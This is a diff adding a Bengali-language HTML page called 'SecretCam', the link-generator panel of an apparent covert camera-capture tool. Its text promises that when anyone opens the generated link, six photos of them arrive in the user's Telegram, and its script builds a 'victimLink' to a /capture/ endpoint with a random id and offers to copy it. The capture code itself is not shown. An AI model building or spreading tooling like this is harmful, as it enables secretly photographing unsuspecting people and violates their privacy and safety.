@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SecretCam • লিংক তৈরি করো</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0f0f1a;
+      --primary: #00ff9d;
+      --secondary: #ff00c8;
+      --text: #e0e0e0;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Rajdhani', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at center, #1a1a2e, #0f0f1a);
+    }
+    .container {
+      background: rgba(20,20,40,0.8);
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(0,255,157,0.3);
+      border: 1px solid rgba(0,255,157,0.4);
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      animation: glow 3s infinite alternate;
+    }
+    @keyframes glow { from { box-shadow: 0 0 20px rgba(0,255,157,0.3); } to { box-shadow: 0 0 50px rgba(255,0,200,0.5); } }
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.5em;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+    }
+    button {
+      background: linear-gradient(45deg, #00ff9d, #00b86e);
+      color: black;
+      border: none;
+      padding: 16px 32px;
+      font-size: 1.2em;
+      border-radius: 50px;
+      cursor: pointer;
+      margin: 15px 0;
+      transition: all 0.3s;
+      font-weight: bold;
+    }
+    button:hover { transform: scale(1.05); box-shadow: 0 0 20px #00ff9d; }
+    #linkBox {
+      background: #111;
+      padding: 20px;
+      border-radius: 15px;
+      margin: 20px 0;
+      border: 2px dashed var(--primary);
+      word-break: break-all;
+      display: none;
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      background: #222;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-size: 1em;
+      margin: 10px 0;
+    }
+    .photos {
+      margin-top: 30px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 10px;
+    }
+    .photos img {
+      width: 100%;
+      border-radius: 12px;
+      border: 3px solid var(--primary);
+      box-shadow: 0 0 15px rgba(0,255,157,0.5);
+    }
+    .loading {
+      color: var(--primary);
+      font-size: 1.2em;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse { 0%,100% { opacity:0.6; } 50% { opacity:1; } }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>SecretCam</h1>
+  <p>একটা লিংক বানাও, কেউ খুললেই তার ৬টা ছবি তোমার টেলিগ্রামে চলে আসবে!</p>
+  
+  <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+
+  <div id="linkBox">
+    <p>তোমার সিক্রেট লিংক রেডি!</p>
+    <input type="text" id="victimLink" readonly />
+    <button onclick="copyLink()">কপি করুন</button>
+    <br><br>
+    <a href="" id="testLink" target="_blank" style="color:#ff00c8;">নিজে টেস্ট করো (ফোন দিয়ে)</a>
+  </div>
+
+  <div class="photos" id="photos">
+    <div class="loading">ছবি আসছে... অপেক্ষা করো</div>
+  </div>
+</div>
+
+<script>
+const baseUrl = location.href.split('/').slice(0, -1).join('/') + '/capture/';
+let currentId = null;
+
+function generateLink() {
+  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+  const victimUrl = `${baseUrl}?id=${currentId}`;
+  
+  document.getElementById("linkBox").style.display = "block";
+  document.getElementById("victimLink").value = victimUrl;
+  document.getElementById("testLink").href = victimUrl;
+  
+  document.getElementById("photos").innerHTML = "<div class='loading'>ছবি আসছে... অপেক্ষা করো</div>";
+}
+
+function copyLink() {
+  const link = document.getElementById("victimLink");
+  link.select();
+  document.execCommand("copy");
+  alert("লিংক কপি হয়ে গেছে!");
+}
+</script>
+</body>
+</html>
